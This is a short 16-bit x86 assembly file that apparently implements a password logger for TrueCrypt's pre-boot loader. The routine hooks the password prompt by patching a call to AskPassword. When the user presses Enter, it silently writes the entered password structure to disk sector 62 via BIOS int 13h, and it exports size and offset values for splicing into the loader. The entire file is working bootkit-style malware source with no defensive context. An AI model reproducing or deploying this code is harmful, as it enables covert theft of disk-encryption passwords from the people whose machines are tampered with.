cpu	686
use16

segment .text


GLOBAL	Logger
GLOBAL	g_uLoggerCodeSize
GLOBAL	g_uCallAskPasswordDeltaOffset


%define TC_BIOS_KEY_ENTER 1ch

Logger:	push	bp
		mov	bp, sp

		push	word [bp+4]
CallAskPassword:
		call	$+3		; will be patched to "call AskPassword"
		add	sp, 2

		cmp	al, TC_BIOS_KEY_ENTER
		jnz	.exit

;typedef struct
;{
;	unsigned __int32 Length;
;	unsigned char Text[MAX_PASSWORD + 1];
;	char Pad[3]; // keep 64-bit alignment
;} Password;

		push	ax
		push	es

		push	ds
		pop	es


		mov	ax, 0301h	; write one sector
		mov	cx, 62		; number #61, disk offset 0x7a00
		mov	dx, 0080h
		mov	bx, word [bp+4] ; arg0
		int	13h

		pop	es
		pop	ax

.exit:		pop	bp
		ret			; cdecl

g_uLoggerCodeSize	dw		$-Logger
g_uCallAskPasswordDeltaOffset	dw	CallAskPassword-Logger+1
